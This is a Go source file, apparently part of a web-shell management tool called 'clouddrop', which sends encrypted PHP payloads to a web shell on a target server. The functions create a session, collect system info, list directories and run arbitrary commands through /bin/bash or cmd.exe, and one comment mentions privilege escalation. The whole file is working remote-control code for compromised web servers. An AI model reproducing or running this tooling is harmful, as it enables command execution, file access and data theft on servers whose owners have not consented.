package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"os"
)

var PhpSessions map[int]string

func (s *PHPShell) GetShellType() string {
	return "php"
}

func (s *PHPShell) FreshSession(id int, url string, password string) (string, error) {
	if PhpSessions == nil {
		// first init php shell
		PhpSessions = make(map[int]string)
	}
	// Get the target code and encrypt
	code, err := os.ReadFile("./pkg/api/php/Check.php")
	if err != nil {
		return "", err
	}
	code = append(code, []byte("\nmain();")...) // add main() to call

	// 加密code
	enCode := util.Encrypt(string(code), password)

	PhpSessions[id], _ = util.PostRequestWithoutSession(url, password, enCode)
	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
	log.Println("当前PHPSESSID " + session)
	enResult, err := util.PostRequest(url, password, enCode, session)
	if err != nil {
		return "", err
	}
	// 解密code
	res := util.Decrypt(enResult, password)

	return res, nil
}

// BaseInfo
func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error) {
	// code := `echo getcwd();`
	code, err := os.ReadFile("./pkg/api/php/BaseInfo.php")
	if err != nil {
		return "", err
	}
	code = fmt.Append(code, "\nmain();") // add main() to call

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	return res, nil
}

// FileList lists all files in the current directory
func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
	code, err := os.ReadFile("./pkg/api/php/FileList.php")
	if err != nil {
		return "", err
	}
	code = fmt.Appendf(code, "\nmain(\"%s\");", path)

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	// todo 解析结果
	return res, nil
}

// ExecCommand executes a command on the PHP shell and returns the output
func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
	// Todo 需要支持自己上传cmd。有时候可以提权
	// 1. first need to get the system type
	code, err := os.ReadFile("./pkg/api/php/OS.php")
	if err != nil {
		return "", err
	}
	code = fmt.Append(code, "\nmain();")

	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	// 2. base on the osType, execute the command
	code, err = os.ReadFile("./pkg/api/php/CMD.php")
	if err != nil {
		return "", err
	}
	var cmdPath string // if block-level scope, it must define at out
	if osType == "Linux" {
		cmdPath = "/bin/bash"
	} else {
		cmdPath = "C:/Windows/System32/cmd.exe"
	}
	code = fmt.Appendf(code, "\nmain(\"%s\",\"true\",\"%s\");", cmdPath, command)

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	return res, nil
}
